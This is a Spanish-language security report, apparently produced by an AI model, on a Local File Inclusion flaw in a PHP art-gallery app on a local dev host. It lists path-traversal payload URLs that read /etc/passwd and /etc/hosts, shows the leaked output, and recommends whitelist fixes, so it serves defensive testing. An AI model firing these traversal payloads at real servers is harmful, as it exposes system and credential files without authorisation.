# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Objetivo:** http://web.dev.local:8081  
**Fecha:** 2026-04-30  
**Analista:** Copilot (claude-sonnet-4.6)  
**Tipo de vulnerabilidad:** Local File Inclusion (LFI)

---

## 1. Resumen Ejecutivo

Se identificó y explotó una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor mediante la manipulación del parámetro `page` en `gallery.php`.

**Severidad:** 🔴 CRÍTICA

---

## 2. Descripción de la Aplicación

La aplicación es una galería de arte virtual que ofrece las siguientes secciones:
- Arte Moderno: `gallery.php?page=modern`
- Arte Clásico: `gallery.php?page=classic`
- Arte Abstracto: `gallery.php?page=abstract`
- Acerca de: `gallery.php?page=about`

---

## 3. Vulnerabilidad Encontrada

### 3.1 Local File Inclusion en `gallery.php`

| Campo | Detalle |
|-------|---------|
| **URL vulnerable** | `http://web.dev.local:8081/gallery.php` |
| **Parámetro afectado** | `page` |
| **Método** | GET |
| **Tipo** | Local File Inclusion (LFI) |
| **CWE** | CWE-22 (Path Traversal) / CWE-98 (Improper Control of Filename for Include) |

**Descripción:** El parámetro `page` es utilizado directamente por la función `include()` de PHP sin ningún tipo de sanitización ni validación, permitiendo el uso de secuencias de path traversal (`../`) para navegar fuera del directorio previsto.

---

## 4. Explotación

### 4.1 Lectura de /etc/passwd

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Lectura de /etc/hosts

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
fe00::      ip6-localnet
ff00::      ip6-mcastprefix
ff02::1     ip6-allnodes
```

---

## 5. Impacto

La explotación de esta vulnerabilidad permite:

1. **Lectura de archivos sensibles del sistema:** `/etc/passwd`, `/etc/shadow` (si los permisos lo permiten), configuraciones del servidor.
2. **Divulgación de información confidencial:** Credenciales, claves API, configuraciones de base de datos.
3. **Escalada potencial:** Combinada con otras técnicas (log poisoning, PHP wrappers), podría derivar en ejecución remota de código (RCE).
4. **Reconocimiento del sistema:** El atacante puede enumerar usuarios, rutas del sistema, versiones de software.

---

## 6. Recomendaciones

### 6.1 Corrección Inmediata

1. **Validar y sanitizar el parámetro `page`:** Usar una lista blanca (whitelist) de valores permitidos:
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed_pages)) {
       die('Página no válida');
   }
   include('pages/' . $_GET['page'] . '.php');
   ```

2. **Evitar incluir ficheros basados en input de usuario** sin validación estricta.

3. **Usar `basename()`** para eliminar rutas relativas si es necesario aceptar nombres de archivo dinámicos.

### 6.2 Medidas Adicionales

- Configurar `open_basedir` en PHP para restringir el acceso a directorios específicos.
- Deshabilitar `allow_url_include` en `php.ini`.
- Implementar un WAF (Web Application Firewall) que detecte secuencias de path traversal.
- Aplicar el principio de mínimo privilegio al proceso del servidor web.
- Realizar auditorías de seguridad periódicas.

---

## 7. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de LFI que ha sido explotada con éxito, permitiendo la lectura de archivos sensibles del sistema. Se recomienda aplicar las correcciones indicadas de forma urgente antes de exponer la aplicación a entornos de producción.

---

*Informe generado automáticamente durante análisis de seguridad autorizado.*
